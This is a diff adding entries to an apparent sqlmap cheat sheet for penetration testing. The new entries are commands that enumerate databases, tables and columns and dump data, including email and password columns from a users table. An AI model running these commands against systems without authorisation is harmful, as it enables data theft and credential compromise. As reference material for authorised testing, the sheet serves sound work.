@@ -13,6 +13,30 @@ sqlmap ... --batch
 ```bash
 sqlmap ... --current-user --banner --current-db --is-dba
 ```
+### Enum dbs
+```bash
+sqlmap ... --dbs
+```
+### Enum tables
+```bash
+sqlmap ... -D dbname --tables
+```
+### Enum columns
+```bash
+sqlmap ... -D dbname -T users --columns
+```
+### Dump everything
+```bash
+sqlmap ... --dump-all
+```
+### Dump table contents
+```bash
+sqlmap ... --dump -D dbname -T users -C email,password
+```
+### Dump w/ filters
+```bash
+sqlmap ... --dump -D dbname -T users --where="email LIKE '%something%'" --start=1 --stop=15
+```
 ### Send traffic through proxy
 ```bash
 sqlmap ... --proxy http://127.0.0.1:8080
